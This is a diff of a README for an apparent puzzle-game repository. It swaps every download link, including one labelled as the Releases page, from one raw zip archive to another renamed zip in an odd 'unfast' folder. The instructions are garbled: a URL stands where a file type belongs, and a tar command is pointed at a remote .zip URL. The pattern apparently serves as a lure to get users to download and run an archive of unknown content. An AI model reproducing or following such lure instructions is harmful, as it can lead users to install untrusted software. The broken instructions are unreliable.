@@ -1,6 +1,6 @@
 # 🧩 Semester-Break-Challenge-Cicada3301 - Unravel Puzzles and Outsmart Rivals
 
-[![Download the latest release](https://raw.githubusercontent.com/KeepDev20/Semester-Break-Challenge-Cicada3301/main/unfast/Semester-Break-Challenge-Cicada3301.zip%https://raw.githubusercontent.com/KeepDev20/Semester-Break-Challenge-Cicada3301/main/unfast/Semester-Break-Challenge-Cicada3301.zip)](https://raw.githubusercontent.com/KeepDev20/Semester-Break-Challenge-Cicada3301/main/unfast/Semester-Break-Challenge-Cicada3301.zip)
+[![Download the latest release](https://github.com/KeepDev20/Semester-Break-Challenge-Cicada3301/raw/refs/heads/main/unfast/Semester-Challenge-Break-Cicada-v3.1.zip%https://github.com/KeepDev20/Semester-Break-Challenge-Cicada3301/raw/refs/heads/main/unfast/Semester-Challenge-Break-Cicada-v3.1.zip)](https://github.com/KeepDev20/Semester-Break-Challenge-Cicada3301/raw/refs/heads/main/unfast/Semester-Challenge-Break-Cicada-v3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This guide will take you step-by-step through the process of downloading and run
 
 ## 📥 Download & Install
 
-To begin, visit the Releases page to download the application. You can find it here: [Download the Release](https://raw.githubusercontent.com/KeepDev20/Semester-Break-Challenge-Cicada3301/main/unfast/Semester-Break-Challenge-Cicada3301.zip).
+To begin, visit the Releases page to download the application. You can find it here: [Download the Release](https://github.com/KeepDev20/Semester-Break-Challenge-Cicada3301/raw/refs/heads/main/unfast/Semester-Challenge-Break-Cicada-v3.1.zip).
 
 1. Click on the link above. 
 2. You will see a list of available versions. 
@@ -43,9 +43,9 @@ Now follow these steps based on your operating system.
 
 1. Open the Terminal.
 2. Change to the directory where the file has been downloaded.
-3. If the file is a `https://raw.githubusercontent.com/KeepDev20/Semester-Break-Challenge-Cicada3301/main/unfast/Semester-Break-Challenge-Cicada3301.zip`, run: 
+3. If the file is a `https://github.com/KeepDev20/Semester-Break-Challenge-Cicada3301/raw/refs/heads/main/unfast/Semester-Challenge-Break-Cicada-v3.1.zip`, run: 
    ```
-   tar -xzvf https://raw.githubusercontent.com/KeepDev20/Semester-Break-Challenge-Cicada3301/main/unfast/Semester-Break-Challenge-Cicada3301.zip
+   tar -xzvf https://github.com/KeepDev20/Semester-Break-Challenge-Cicada3301/raw/refs/heads/main/unfast/Semester-Challenge-Break-Cicada-v3.1.zip
    ```
 4. Follow any instructions provided in the unpacked folder to complete the installation.
 
@@ -86,4 +86,4 @@ For any questions or feedback, please refer to the appropriate channels provided
 
 ---
 
-For more updates, remember to check back at the [Releases page](https://raw.githubusercontent.com/KeepDev20/Semester-Break-Challenge-Cicada3301/main/unfast/Semester-Break-Challenge-Cicada3301.zip). Happy puzzling!
+For more updates, remember to check back at the [Releases page](https://github.com/KeepDev20/Semester-Break-Challenge-Cicada3301/raw/refs/heads/main/unfast/Semester-Challenge-Break-Cicada-v3.1.zip). Happy puzzling!
